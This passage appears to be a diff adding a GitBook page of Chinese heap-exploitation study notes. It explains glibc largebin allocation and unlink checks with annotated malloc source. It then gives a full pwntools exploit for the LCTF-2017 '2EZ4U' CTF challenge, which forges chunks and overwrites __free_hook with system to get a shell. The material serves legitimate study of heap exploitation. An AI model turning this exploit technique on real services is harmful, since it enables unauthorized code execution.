+                      (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb))) <span class="hljs-comment">//&#x7B2C;&#x4E8C;&#x6B65;&#xFF0C;&#x4ECE;&#x6700;&#x5C0F;&#x7684;chunk&#x5F00;&#x59CB;&#xFF0C;&#x53CD;&#x5411;&#x904D;&#x5386; chunk size&#x94FE;&#x8868;&#xFF0C;&#x76F4;&#x5230;&#x627E;&#x5230;&#x7B2C;&#x4E00;&#x4E2A;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x6240;&#x9700;chunk&#x5927;&#x5C0F;&#x7684;chunk&#x9000;&#x51FA;&#x5FAA;&#x73AF;</span>
+                victim = victim-&gt;bk_nextsize; 
+
+              <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip
+                 list does not have to be rerouted.  */</span>
+              <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="hljs-comment">//&#x7B2C;&#x4E09;&#x6B65;&#xFF0C;&#x7533;&#x8BF7;&#x7684;chunk&#x5BF9;&#x5E94;&#x7684;chunk&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x7ED3;&#x70B9;&#xFF0C;&#x5219;&#x7533;&#x8BF7;&#x76F8;&#x5E94;&#x5806;&#x5934;&#x7684;&#x4E0B;&#x4E2A;&#x7ED3;&#x70B9;&#xFF0C;&#x4E0D;&#x7533;&#x8BF7;&#x5806;&#x5934;&#x3002;</span>
+                victim = victim-&gt;fd;
+
+              remainder_size = size - nb;
+              unlink (av, victim, bck, fwd); <span class="hljs-comment">//&#x7B2C;&#x56DB;&#x6B65;&#xFF0C;largebin unlink &#x64CD;&#x4F5C;</span>
+
+              <span class="hljs-comment">/* Exhaust */</span>
+              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) <span class="hljs-comment">//&#x7B2C;&#x4E94;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x5269;&#x4F59;&#x7684;&#x7A7A;&#x95F4;&#x5C0F;&#x4E8E;MINSIZE&#xFF0C;&#x5219;&#x5C06;&#x8BE5;&#x7A7A;&#x95F4;&#x76F4;&#x63A5;&#x7ED9;&#x7528;&#x6237;</span>
+                {
+                  set_inuse_bit_at_offset (victim, size);
+                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)
+                    victim-&gt;size |= NON_MAIN_ARENA;
+                }
+              <span class="hljs-comment">/* Split */</span>
+              <span class="hljs-keyword">else</span>
+                {
+                  remainder = chunk_at_offset (victim, nb); <span class="hljs-comment">//&#x7B2C;&#x516D;&#x6B65;&#xFF0C;&#x5982;&#x679C;&#x5F53;&#x524D;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x8FD8;&#x53EF;&#x4EE5;&#x6784;&#x6210;chunk&#xFF0C;&#x5219;&#x5C06;&#x5269;&#x4F59;&#x7684;&#x7A7A;&#x95F4;&#x653E;&#x5165;&#x5230;unsorted bin&#x4E2D;&#x3002;</span>
+                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore
+                     have to perform a complete insert here.  */</span>
+                  bck = unsorted_chunks (av);
+                  fwd = bck-&gt;fd;
+      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))
+                    {
+                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;
+                      <span class="hljs-keyword">goto</span> errout;
+                    }
+                  remainder-&gt;bk = bck;
+                  remainder-&gt;fd = fwd;
+                  bck-&gt;fd = remainder;
+                  fwd-&gt;bk = remainder;
+                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))
+                    {
+                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;
+                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;
+                    }
+                  set_head (victim, nb | PREV_INUSE |
+                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));
+                  set_head (remainder, remainder_size | PREV_INUSE);
+                  set_foot (remainder, remainder_size);
+                }
+              check_malloced_chunk (av, victim, nb);
+              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);
+              alloc_perturb (p, bytes);
+              <span class="hljs-keyword">return</span> p;
+            }
+        }
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x5C06;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x603B;&#x7ED3;&#x4E3A;&#xFF1A;</p>
+<ol>
+<li>&#x627E;&#x5230;&#x5F53;&#x524D;&#x8981;&#x7533;&#x8BF7;&#x7684;&#x7A7A;&#x95F4;&#x5BF9;&#x5E94;&#x7684;largebin&#x94FE;&#x8868;&#xFF0C;&#x5224;&#x65AD;&#x7B2C;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#x5373;&#x6700;&#x5927;&#x7ED3;&#x70B9;&#x7684;&#x5927;&#x5C0F;&#x662F;&#x5426;&#x5927;&#x4E8E;&#x8981;&#x7533;&#x8BF7;&#x7684;&#x7A7A;&#x95F4;&#xFF0C;&#x5982;&#x679C;&#x5C0F;&#x4E8E;&#x5219;&#x8BF4;&#x660E;largebin&#x4E2D;&#x6CA1;&#x6709;&#x5408;&#x9002;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x9700;&#x91C7;&#x7528;&#x5176;&#x4ED6;&#x5206;&#x914D;&#x65B9;&#x5F0F;&#x3002;</li>
+<li>&#x5982;&#x679C;&#x5F53;&#x524D;largebin&#x4E2D;&#x5B58;&#x5728;&#x5408;&#x9002;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x5219;&#x4ECE;&#x6700;&#x5C0F;&#x5806;&#x5757;&#x5F00;&#x59CB;&#xFF0C;&#x901A;&#x8FC7;<code>bk_nextsize</code>&#x53CD;&#x5411;&#x904D;&#x5386;&#x94FE;&#x8868;&#xFF0C;&#x627E;&#x5230;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;&#x5F53;&#x524D;&#x7533;&#x8BF7;&#x7A7A;&#x95F4;&#x7684;&#x7ED3;&#x70B9;&#x3002;</li>
+<li>&#x4E3A;&#x51CF;&#x5C11;&#x64CD;&#x4F5C;&#xFF0C;&#x5224;&#x65AD;&#x627E;&#x5230;&#x7684;&#x76F8;&#x5E94;&#x7ED3;&#x70B9;&#xFF08;&#x5806;&#x5934;&#xFF09;&#x7684;&#x4E0B;&#x4E2A;&#x7ED3;&#x70B9;&#x662F;&#x5426;&#x662F;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x7684;&#x8BDD;&#xFF0C;&#x5C06;&#x76EE;&#x6807;&#x8BBE;&#x7F6E;&#x4E3A;&#x8BE5;&#x5806;&#x5934;&#x7684;&#x7B2C;&#x4E8C;&#x4E2A;&#x7ED3;&#x70B9;&#xFF0C;&#x4EE5;&#x6B64;&#x51CF;&#x5C11;&#x5C06;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x8D4B;&#x503C;&#x7684;&#x64CD;&#x4F5C;&#x3002;</li>
+<li>&#x8C03;&#x7528;<code>unlink</code>&#x5C06;&#x76EE;&#x6807;largebin chunk&#x4ECE;&#x53CC;&#x94FE;&#x8868;&#x4E2D;&#x53D6;&#x4E0B;&#x3002;</li>
+<li>&#x5224;&#x65AD;&#x5269;&#x4F59;&#x7A7A;&#x95F4;&#x662F;&#x5426;&#x5C0F;&#x4E8E;MINSIZE&#xFF0C;&#x5982;&#x679C;&#x5C0F;&#x4E8E;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;&#x7ED9;&#x7528;&#x6237;&#x3002;</li>
+<li>&#x5426;&#x5219;&#x5C06;&#x5269;&#x4F59;&#x7684;&#x7A7A;&#x95F4;&#x6784;&#x6210;&#x65B0;&#x7684;chunk&#x653E;&#x5165;&#x5230;unsorted bin&#x4E2D;&#x3002;</li>
+</ol>
+<h4 id="unlink">unlink</h4>
+<pre><code class="lang-c"><span class="hljs-comment">/* Take a chunk off a bin list */</span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) {                                            </span>
+    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, <span class="hljs-number">0</span>))      
+      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  
+    FD = P-&gt;fd;                                      
+    BK = P-&gt;bk;                                      
+    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))              
+      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  
+    <span class="hljs-keyword">else</span> {                                      
+        FD-&gt;bk = BK;                                  
+        BK-&gt;fd = FD;                                  
+        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)                      
+            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) {              
+        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)          
+        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    
+          malloc_printerr (check_action,                      
+                   <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    
+                   P, AV);                          
+            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) {                      
+                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                      
+                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              
+                <span class="hljs-keyword">else</span> {                                  
+                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  
+                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  
+                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  
+                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  
+                  }                                  
+              } <span class="hljs-keyword">else</span> {                                  
+                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              
+                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              
+              }                                      
+          }                                      
+      }                                          
+}
+</code></pre>
+<p>&#x518D;&#x770B;&#x770B;largebin&#x7684;unlink&#x68C0;&#x67E5;&#xFF0C;&#x4ECE;&#x4EE3;&#x7801;&#x4E2D;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5C31;&#x662F;&#x591A;&#x4E86;<code>fd_nextsize</code>&#x548C;<code>bk_nextsize</code>&#x4FE9;&#x4E2A;&#x4F4D;&#x7F6E;&#x7684;&#x68C0;&#x67E5;&#xFF0C;&#x539F;&#x7406;&#x548C;<code>fd</code>&#x548C;<code>bk</code>&#x7684;&#x68C0;&#x67E5;&#x4E00;&#x81F4;&#x3002;&#x4F46;&#x662F;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x5BF9;&#x4E8E;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x6EE1;&#x8DB3;&#x7A7A;&#x95F4;&#x7684;&#x5806;&#x5757;&#x6765;&#x8BF4;&#xFF0C;&#x7533;&#x8BF7;&#x51FA;&#x6765;&#x7684;&#x662F;&#x5806;&#x5934;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#xFF0C;&#x5B83;&#x7684;<code>fd_nextsize</code>&#x548C;<code>bk_nextsize</code>&#x4E3A;&#x7A7A;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5373;&#x4F7F;&#x5B83;&#x662F;largebin chunk&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x7684;<code>fd_nextsize</code>&#x4E5F;&#x4E3A;&#x7A7A;&#xFF0C;&#x5373;&#x4E0D;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6;<code>__builtin_expect (P-&gt;fd_nextsize != NULL, 0)</code>&#xFF0C;&#x5BF9;&#x4E8E;&#x6B64;&#x7C7B;chunk&#x7684;unlink&#xFF0C;&#x53EA;&#x4F1A;&#x50CF;smallbin&#x7684;unlink&#x4E00;&#x6837;&#x68C0;&#x67E5;<code>fd</code>&#x4E0E;<code>bk</code>&#xFF0C;&#x800C;&#x4E0D;&#x4F1A;&#x5BF9;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#x4E0E;&#x64CD;&#x4F5C;&#x3002;</p>
+<p>&#x81F3;&#x6B64;largebin&#x94FE;&#x8868;&#x7684;&#x5F62;&#x6210;&#x4EE5;&#x53CA;&#x7533;&#x8BF7;largebin&#x90FD;&#x5DF2;&#x7ECF;&#x9610;&#x8FF0;&#x6E05;&#x695A;&#x3002;&#x518D;&#x5C0F;&#x7ED3;&#x4E0B;&#xFF0C;&#x5BF9;&#x4E8E;largebin&#x7684;&#x94FE;&#x8868;&#x7684;&#x63D2;&#x5165;&#xFF0C;&#x53CC;&#x94FE;&#x8868;&#x662F;&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x7684;chunk&#x6392;&#x5E8F;&#xFF0C;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;chunk&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x5806;&#x5934;&#xFF0C;&#x53EA;&#x6709;&#x5806;&#x5934;&#x7684;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x4F1A;&#x88AB;&#x8D4B;&#x503C;&#xFF0C;&#x5176;&#x4F59;&#x5806;&#x5757;&#x7684;&#x8BE5;&#x5B57;&#x6BB5;&#x4E3A;0&#x3002;&#x63D2;&#x5165;&#x7684;&#x904D;&#x5386;&#x662F;&#x901A;&#x8FC7;<code>fd_nextsize</code>&#x4ECE;&#x5927;&#x5230;&#x5C0F;&#x8FDB;&#x884C;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x63D2;&#x5165;&#x7684;chunk&#x5B58;&#x5728;&#x5BF9;&#x5E94;&#x5806;&#x5934;&#xFF0C;&#x5219;&#x63D2;&#x5165;&#x5230;&#x8BE5;&#x5806;&#x5934;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#xFF0C;&#x5426;&#x5219;&#x7684;&#x8BDD;&#x8BE5;chunk&#x4F1A;&#x6210;&#x4E3A;&#x5806;&#x5934;&#x63D2;&#x5165;&#x5230;&#x94FE;&#x8868;&#x4E2D;&#x3002;</p>
+<p>&#x5BF9;&#x4E8E;largebin&#x7684;&#x7533;&#x8BF7;&#xFF0C;&#x901A;&#x8FC7;&#x5224;&#x65AD;&#x53CC;&#x94FE;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#xFF08;&#x6700;&#x5927;&#x7ED3;&#x70B9;&#xFF09;&#x7684;&#x5927;&#x5C0F;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x5B58;&#x5728;&#x6EE1;&#x8DB3;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5219;&#x4ECE;&#x5C0F;&#x5230;&#x5927;&#x901A;&#x8FC7;<code>bk_nextsize</code>&#x53CD;&#x5411;&#x904D;&#x5386;&#x53CC;&#x94FE;&#x8868;&#xFF0C;&#x627E;&#x5230;&#x6700;&#x5C0F;&#x7684;&#x6EE1;&#x8DB3;&#x7533;&#x8BF7;&#x9700;&#x6C42;&#x7684;&#x5806;&#x5757;&#xFF0C;&#x5982;&#x679C;&#x8BE5;&#x5806;&#x5934;&#x4E0B;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#x7684;&#x5927;&#x5C0F;&#x4E5F;&#x6EE1;&#x8DB3;&#x5219;&#x5C06;&#x8BE5;&#x7ED3;&#x70B9;&#x4F5C;&#x4E3A;&#x76EE;&#x6807;&#x5206;&#x914D;&#x7ED9;&#x7528;&#x6237;&#xFF0C;&#x4EE5;&#x6B64;&#x51CF;&#x5C11;&#x94FE;&#x8868;&#x7684;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x64CD;&#x4F5C;&#xFF0C;&#x63D0;&#x9AD8;&#x6548;&#x7387;&#x3002;&#x5BF9;&#x4E8E;&#x53CC;&#x94FE;&#x8868;&#x7684;unlink&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x5C31;&#x662F;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x68C0;&#x67E5;&#xFF0C;&#x7279;&#x522B;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x5F53;&#x7ED3;&#x70B9;&#x662F;&#x5806;&#x5934;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x7ED3;&#x70B9;&#x65F6;&#xFF0C;&#x5B83;&#x7684;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x4E3A;0&#xFF0C;&#x6B64;&#x65F6;unlink&#x64CD;&#x4F5C;&#x4E0E;smallbin&#x7684;unlink&#x64CD;&#x4F5C;&#x4E00;&#x81F4;&#xFF0C;&#x6CA1;&#x6709;<code>fd_nextsize</code>&#x4E0E;<code>bk_nextsize</code>&#x7684;&#x68C0;&#x67E5;&#x4E0E;&#x64CD;&#x4F5C;&#x3002;</p>
+<h4 id="lctf-2017-2ez4u">LCTF-2017 2EZ4U</h4>
+<p>exp</p>
+<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># coding=utf-8</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+
+<span class="hljs-comment">#context.log_level=&apos;debug&apos;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span><span class="hljs-params">(l,d)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>,<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,<span class="hljs-string">&apos;0&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,<span class="hljs-string">&apos;0&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,<span class="hljs-string">&apos;0&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,str(l))
+    p.sendlineafter(<span class="hljs-string">&apos;apple:&apos;</span>,d)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Edit</span><span class="hljs-params">(idx,d)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>,<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,str(idx))
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,<span class="hljs-string">&apos;0&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,<span class="hljs-string">&apos;0&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,<span class="hljs-string">&apos;0&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;apple:&apos;</span>,d)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Show</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>,<span class="hljs-string">&apos;4&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,str(idx))
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span><span class="hljs-params">(idx)</span>:</span>
+    p.sendlineafter(<span class="hljs-string">&apos;choice: &apos;</span>,<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendlineafter(<span class="hljs-string">&apos;):&apos;</span>,str(idx))
+
+p=process(<span class="hljs-string">&apos;./2ez4u&apos;</span>)
+libc=ELF(<span class="hljs-string">&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;</span>,checksec=<span class="hljs-keyword">False</span>)
+
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;0&apos;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#0</span>
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;1&apos;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span>
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;2&apos;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#2</span>
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;3&apos;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#3</span>
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;4&apos;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span>
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;5&apos;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#5</span>
+Add(<span class="hljs-number">0x3f0</span>,<span class="hljs-string">&apos;7&apos;</span>*<span class="hljs-number">0x3f0</span>)<span class="hljs-comment">#6</span>
+Add(<span class="hljs-number">0x60</span>,  <span class="hljs-string">&apos;8&apos;</span>*<span class="hljs-number">0x60</span> )<span class="hljs-comment">#7</span>
+Add(<span class="hljs-number">0x3e0</span>, <span class="hljs-string">&apos;9&apos;</span>*<span class="hljs-number">0x3e0</span>)<span class="hljs-comment">#8</span>
+Add(<span class="hljs-number">0x60</span>,  <span class="hljs-string">&apos;9&apos;</span>*<span class="hljs-number">0x80</span> )<span class="hljs-comment">#9</span>
+Add(<span class="hljs-number">0x3f0</span>, <span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x3d0</span>)<span class="hljs-comment">#a</span>
+Add(<span class="hljs-number">0x60</span><span class="hljs-number">-0x18</span>,  <span class="hljs-string">&apos;b&apos;</span>*<span class="hljs-number">0x30</span> )<span class="hljs-comment">#b</span>
+Add(<span class="hljs-number">0x60</span><span class="hljs-number">-0x18</span>,  <span class="hljs-string">&apos;c&apos;</span>*<span class="hljs-number">0x30</span> )<span class="hljs-comment">#c</span>
+Add(<span class="hljs-number">0x60</span><span class="hljs-number">-0x18</span>,  <span class="hljs-string">&apos;d&apos;</span>*<span class="hljs-number">0x30</span> )<span class="hljs-comment">#d</span>
+
+Del(<span class="hljs-number">8</span>)
+Del(<span class="hljs-number">0xa</span>)
+Del(<span class="hljs-number">0</span>)
+
+Add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&apos;&apos;</span>)<span class="hljs-comment">#1</span>
+
+Show(<span class="hljs-number">0xa</span>)
+p.recvuntil(<span class="hljs-string">&apos;description:&apos;</span>)
+heap_addr=u64(p.recvuntil(<span class="hljs-string">&apos;\n&apos;</span>,drop=<span class="hljs-keyword">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&apos;\0&apos;</span>))<span class="hljs-number">-0x790</span>
+success(<span class="hljs-string">&apos;heap_addr:&apos;</span>+hex(heap_addr))
+target_addr=heap_addr+<span class="hljs-number">0x130</span> <span class="hljs-comment">#2</span>
+fchunk1_addr=heap_addr+<span class="hljs-number">0xb0</span> <span class="hljs-comment">#1</span>
+fchunk2_addr=heap_addr+<span class="hljs-number">0x1b0</span> <span class="hljs-comment">#3</span>
+fchunk3_addr=heap_addr+<span class="hljs-number">0xc10</span> <span class="hljs-comment">#10</span>
+
+success(<span class="hljs-string">&apos;target_addr:&apos;</span>+hex(target_addr))
+success(<span class="hljs-string">&apos;fchunk1_addr:&apos;</span>+hex(fchunk1_addr))
+success(<span class="hljs-string">&apos;fchunk2_addr:&apos;</span>+hex(fchunk2_addr))
+success(<span class="hljs-string">&apos;fchunk3_addr:&apos;</span>+hex(fchunk3_addr))
+
+Edit(<span class="hljs-number">0xa</span>,p64(target_addr))
+
+ftarget=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x411</span>)+p64(fchunk1_addr<span class="hljs-number">-0x18</span>)+p64(fchunk1_addr<span class="hljs-number">-0x10</span>)
+ftarget+=p64(fchunk3_addr)+p64(fchunk2_addr)
+Edit(<span class="hljs-number">2</span>,ftarget)
+
+fake=p64(<span class="hljs-number">0</span>)+p64(target_addr)
+Edit(<span class="hljs-number">1</span>,fake)
+
+fake=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x421</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(target_addr)
+Edit(<span class="hljs-number">3</span>,fake)
+Edit(<span class="hljs-number">6</span>,<span class="hljs-string">&apos;6&apos;</span>*<span class="hljs-number">0x218</span>+p64(<span class="hljs-number">0x410</span>)+p64(<span class="hljs-number">0x411</span>))
+
+Del(<span class="hljs-number">5</span>)
+Del(<span class="hljs-number">3</span>)
+
+Add(<span class="hljs-number">0x3f0</span>,<span class="hljs-string">&apos;3&apos;</span>*<span class="hljs-number">56</span>)<span class="hljs-comment">#3</span>
+Add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&apos;&apos;</span>)<span class="hljs-comment">#5</span>
+Show(<span class="hljs-number">3</span>)
+p.recvuntil(<span class="hljs-string">&apos;3&apos;</span>*<span class="hljs-number">56</span>)
+libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&apos;\0&apos;</span>))<span class="hljs-number">-0x3c4be8</span>
+success(<span class="hljs-string">&apos;libc_base:&apos;</span>+hex(libc_base))
+free_hook=libc.sym[<span class="hljs-string">&apos;__free_hook&apos;</span>]+libc_base
+success(<span class="hljs-string">&apos;free_hook:&apos;</span>+hex(free_hook))
+system=libc_base+libc.sym[<span class="hljs-string">&apos;system&apos;</span>]
+<span class="hljs-comment">#unsortbin attack</span>
+
+Del(<span class="hljs-number">6</span>)
+Del(<span class="hljs-number">3</span>)
+
+pay=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x411</span>)+p64(heap_addr+<span class="hljs-number">0x280</span>)+p64(free_hook<span class="hljs-number">-0x48</span>)
+Edit(<span class="hljs-number">2</span>,pay)
+Add(<span class="hljs-number">0x3f0</span>,<span class="hljs-string">&apos;&apos;</span>)
+<span class="hljs-comment">#fastbin attack</span>
+pay=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x71</span>)
+Edit(<span class="hljs-number">2</span>,pay)
+pay=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span>+p64(<span class="hljs-number">0x31</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x431</span>)
+Edit(<span class="hljs-number">3</span>,pay)
+Del(<span class="hljs-number">0xc</span>)
+Del(<span class="hljs-number">0x3</span>)
+
+pay=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x71</span>)+p64(free_hook<span class="hljs-number">-0x3b</span>)
+
+Edit(<span class="hljs-number">2</span>,pay)
+
+Add(<span class="hljs-number">0x60</span><span class="hljs-number">-0x18</span>,<span class="hljs-string">&apos;/bin/sh&apos;</span>)
+pay=<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x13</span>+p64(system)
+
+Add(<span class="hljs-number">0x60</span><span class="hljs-number">-0x18</span>,pay)
+
+pay=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&apos;/bin/sh&apos;</span>
+Edit(<span class="hljs-number">2</span>,pay)
+Del(<span class="hljs-number">3</span>)
+
+p.interactive()
+</code></pre>
+<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;</p>
+<p><a href="https://xz.aliyun.com/t/5177" target="_blank">https://xz.aliyun.com/t/5177</a></p>
+<p><a href="https://eternalsakura13.com/2018/03/21/lctf2/" target="_blank">https://eternalsakura13.com/2018/03/21/lctf2/</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="../how2heap学习/how2heap解析.html" class="navigation navigation-prev " aria-label="Previous page: how2heap解析">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../ptmalloc_check/ptmalloc_check.html" class="navigation navigation-next " aria-label="Next page: ptmalloc_check">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
